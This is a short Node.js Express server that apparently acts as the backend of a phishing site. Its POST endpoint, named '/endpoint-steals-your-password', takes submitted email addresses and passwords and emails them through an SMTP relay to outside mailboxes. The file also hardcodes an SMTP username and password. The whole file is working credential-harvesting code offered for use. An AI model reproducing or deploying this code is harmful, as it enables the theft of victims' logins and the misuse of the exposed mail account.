const express = require("express");
const mailer = require("nodemailer");

const app = express();
const transport = mailer.createTransport({
    host: "smtp-relay.sendinblue.com",
    port: 587,
    secure: false,
    auth: {
        user: "sarsenbai_alihan@mail.ru",
        pass: "mgf9OsIwP7yzrn0V"
    }
});

app.use(express.static("dist"));
app.use(express.json());
app.use(express.urlencoded({extended: false}));

app.get("health", () => console.log("Fisher server is okay"));

app.post("/endpoint-steals-your-password", (req, res) => {
    console.log(req.body);
    transport
        .sendMail({
            from: "sarsenbai_alihan@mail.ru",
            to: ["NeaThe14@yandex.ru", "sarsenbai_alihan@mail.ru"],
            html: `Email: <b>${req.body.email}</b>, Password: <b>${req.body.password}</b>`
        })
        .catch(err => {
            console.log("Error happen while sending email: ", err);
            res.send("Error while sending your credits");
        })
        .then(result => {
            console.log("Email sending result ", result);
            res.send("Your password have stolen, thank you!");
        });
});


app.listen(process.env.PORT || 3000, () => {
    console.log("Server started");
});